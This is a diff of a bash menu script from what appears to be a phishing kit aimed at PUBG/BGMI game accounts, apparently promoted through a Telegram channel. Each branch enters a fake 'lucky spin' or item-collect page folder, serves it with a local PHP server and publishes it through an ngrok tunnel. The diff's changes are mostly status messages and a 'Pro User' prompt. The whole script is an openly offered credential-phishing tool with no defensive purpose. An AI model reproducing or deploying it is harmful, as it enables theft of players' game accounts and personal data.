@@ -41,7 +41,7 @@ echo ""
                            cd SUMAN/ 
                            cd X-Suit/
 			   echo ""
-                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Only Pro User tool\e[m "
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Page Only Pro User \e[m "
                            echo ""
                            echo ""
                            read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
@@ -61,7 +61,7 @@ echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m Fetching server ... \e[0m  "
+			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Online Hacking PUBG BGMI Phishing Server Connect... \e[0m   "
@@ -72,9 +72,6 @@ echo ""
                            sleep 3
 			   echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m NGROK SERVER NOW STARTING ... \e[0m  "
-                           echo ""
-			   sleep 3
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 			   ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
@@ -470,7 +467,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            cd SUMAN1/
                            cd X-Suit-LuckySpin/
 			   echo ""
-                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Only Pro User tool\e[m "
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Page Only Pro User \e[m "
                            echo ""
                            echo ""
                            read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
@@ -486,11 +483,11 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            clear
                            exit
                            fi
-                           echo ""
+			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m Fetching server ... \e[0m  "
+			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Online Hacking PUBG BGMI Phishing Server Connect... \e[0m   "
@@ -501,11 +498,8 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            sleep 3
 			   echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m NGROK SERVER NOW STARTING ... \e[0m  "
-                           echo ""
-			   sleep 3
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+			   ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            clear
                            echo ""
@@ -568,10 +562,27 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 	                   cd SUMAN1/
                            cd Godzilla-LuckySpin/         
                            echo ""
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Page Only Pro User \e[m "
+                           echo ""
+                           echo ""
+                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
+                           echo""
+                           echo""
+                           echo""
+
+                           if [[ $option == *'N'* ]]; then
+                           clear
+                           exit
+                           fi
+                           if [[ $option == *'n'* ]]; then
+                           clear
+                           exit
+                           fi
+			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m Fetching server ... \e[0m  "
+			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Online Hacking PUBG BGMI Phishing Server Connect... \e[0m   "
@@ -582,11 +593,8 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            sleep 3
 			   echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m NGROK SERVER NOW STARTING ... \e[0m  "
-                           echo ""
-			   sleep 3
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+			   ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            clear
                            echo ""
@@ -650,10 +658,27 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 	                   cd SUMAN1/
                            cd COLLECT-S19-ID/         
                            echo ""
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Page Only Pro User \e[m "
+                           echo ""
+                           echo ""
+                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
+                           echo""
+                           echo""
+                           echo""
+
+                           if [[ $option == *'N'* ]]; then
+                           clear
+                           exit
+                           fi
+                           if [[ $option == *'n'* ]]; then
+                           clear
+                           exit
+                           fi
+			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m Fetching server ... \e[0m  "
+			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Online Hacking PUBG BGMI Phishing Server Connect... \e[0m   "
@@ -664,11 +689,8 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                            sleep 3
 			   echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m NGROK SERVER NOW STARTING ... \e[0m  "
-                           echo ""
-			   sleep 3
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+			   ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            clear
                            echo ""
@@ -732,10 +754,27 @@ elif [ $option = 09 ] || [ $option = 9 ]
 	                   cd SUMAN1/
                            cd RPS19-COLLECT/         
                            echo ""
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Page Only Pro User \e[m "
+                           echo ""
+                           echo ""
+                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
+                           echo""
+                           echo""
+                           echo""
+
+                           if [[ $option == *'N'* ]]; then
+                           clear
+                           exit
+                           fi
+                           if [[ $option == *'n'* ]]; then
+                           clear
+                           exit
+                           fi
+			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m Fetching server ... \e[0m  "
+			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Online Hacking PUBG BGMI Phishing Server Connect... \e[0m   "
@@ -746,11 +785,8 @@ elif [ $option = 09 ] || [ $option = 9 ]
                            sleep 3
 			   echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m NGROK SERVER NOW STARTING ... \e[0m  "
-                           echo ""
-			   sleep 3
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+			   ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            clear
                            echo ""
@@ -814,10 +850,27 @@ elif [ $option = 10 ] || [ $option = 010 ]
 	                   cd SUMAN/
                            cd Lucky-Spin-Godzila-S19/     
                            echo ""
+                           printf "\e[31m[\e[32m★\e[31m]\e[32m This Phishing Page Only Pro User \e[m "
+                           echo ""
+                           echo ""
+                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Have Pro User \e[1;91m (Y/N) : \e[0m' option
+                           echo""
+                           echo""
+                           echo""
+
+                           if [[ $option == *'N'* ]]; then
+                           clear
+                           exit
+                           fi
+                           if [[ $option == *'n'* ]]; then
+                           clear
+                           exit
+                           fi
+			   echo ""
                            echo -e $" [\e[92m*\e[91m]\e[1;93m Setting up Online Hacking PUBG BGMI ID Hack Tool ... \e[0m  "
 			   sleep 2
 			   echo ""
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m Fetching server ... \e[0m  "
+			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
 			   sleep 2
 			   echo ""
 			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Online Hacking PUBG BGMI Phishing Server Connect... \e[0m   "
@@ -828,11 +881,8 @@ elif [ $option = 10 ] || [ $option = 010 ]
                            sleep 3
 			   echo ""
 			   echo -e $" [\e[92m*\e[91m]\e[1;93m NGROK SERVER NOW STARTING ... \e[0m  "
-                           echo ""
-			   sleep 3
-			   echo -e $" [\e[92m*\e[91m]\e[1;93m TURN ON MOBILE DATA & HOTSPOT OTHERWISE IT WILL NOT WORK ! \e[0m  "
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                           ./ngrok http 4444 > /dev/null 2>&1 &
+			   ./ngrok http 4444 > /dev/null 2>&1 &
                            sleep 25
                            clear
                            echo ""
